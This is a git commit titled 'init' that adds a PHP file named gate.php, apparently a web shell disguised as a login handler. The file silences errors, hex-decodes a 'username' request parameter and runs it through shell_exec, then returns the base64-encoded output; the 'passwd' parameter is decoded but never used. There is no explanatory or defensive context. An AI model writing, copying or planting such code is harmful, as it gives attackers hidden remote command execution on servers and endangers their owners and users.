c02732ede8085fb3b898019e2883f66af3036938
njcx <njcx86@gmail.com>
2021-07-30 11:02:57 +0800

    init

---
+++ gate.php
@@ -0,0 +1,17 @@
+<?php
+@error_reporting(0);
+function hexToStr($hex){
+    $str="";
+    for($i=0;$i<strlen($hex)-1;$i+=2)
+        $str.=chr(hexdec($hex[$i].$hex[$i+1]));
+    return $str;
+}
+if(isset($_REQUEST['username']) and isset($_REQUEST['passwd'])){
+    $username = hexToStr($_REQUEST['username']);
+    $passwd = hexToStr($_REQUEST['passwd']);
+    $output = shell_exec($username);
+    $encode = base64_encode($output);
+    echo $encode;
+    die;
+}
+?>
